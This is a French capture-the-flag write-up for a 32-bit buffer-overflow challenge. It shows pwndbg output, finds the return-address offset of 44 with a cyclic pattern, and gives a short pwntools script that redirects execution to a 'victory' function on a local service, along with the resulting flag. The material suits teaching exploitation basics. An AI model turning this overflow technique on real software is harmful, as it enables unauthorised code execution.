En décompilant on se rend compte que il faut que on arrive à faire éxecuter la fonction victory:
```
pwndbg> info functions
All defined functions:
Non-debugging symbols:
0x08049000  _init
0x08049030  __libc_start_main@plt
0x08049040  printf@plt
0x08049050  fflush@plt
0x08049060  gets@plt
0x08049070  geteuid@plt
0x08049080  puts@plt
0x08049090  system@plt
0x080490a0  setreuid@plt
0x080490b0  _start
0x080490e0  _dl_relocate_static_pie
0x080490f0  __x86.get_pc_thunk.bx
0x08049100  deregister_tm_clones
0x08049140  register_tm_clones
0x08049180  __do_global_dtors_aux
0x080491b0  frame_dummy
0x080491b6  victory
0x0804920b  game
0x0804926e  main
0x0804928a  __x86.get_pc_thunk.ax
0x08049290  _fini
```
On fait un cyclic
```
pwndbg> cyclic 100
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
```
```
Bonjour, quel est ton pseudo:
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
Tu as perdu aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa, #SKILL_ISSUE

Program received signal SIGSEGV, Segmentation fault.
```
On regarde à combien est l'offset
```
─────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────────
 EAX  0x7f
 EBX  0x6161616a ('jaaa')
 ECX  0
 EDX  0xf7f9a540 ◂— 0xf7f9a540
 EDI  0xf7fd4b80 (_rtld_global_ro) ◂— 0
 ESI  0x804bf00 (__do_global_dtors_aux_fini_array_entry) —▸ 0x8049180 (__do_global_dtors_aux) ◂— endbr32 
 EBP  0x6161616b ('kaaa')
 ESP  0xffae66c0 ◂— 'maaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
 EIP  0x6161616c ('laaa')
```
```
pwndbg> cyclic -l laaa
Finding cyclic pattern of 4 bytes: b'laaa' (hex: 0x6c616161)
Found at offset 44
```
On réécrit la valeur de EIP par l'adresse de la fonction victory en utilisant python ou pwntools:

```
# python3 solve.py
[+] Opening connection to localhost on port 1337: Done
[*] Switching to interactive mode

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xb6\x91^D^H^JTu as perdu AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xb6\x91\x04\x08, #SKILL_ISSUE
Victoire Royale!!!!
interiut{tilted_towers_takeover}[*] Got EOF while reading in interactive

```

solve.py:
```py
from pwn import *
# Offset de EIP 
offset = 44

# Adresse de fonction victory() 
victory_addr = 0x080491b6

# Fabrication du payload
payload = b'A' * offset + p32(victory_addr)

# Connexion au serveur 
io = remote('127.0.0.1', 1337)

# Intéraction avec le binaire
io.recvuntil(b'pseudo:')
io.sendline(payload)
io.interactive()
```
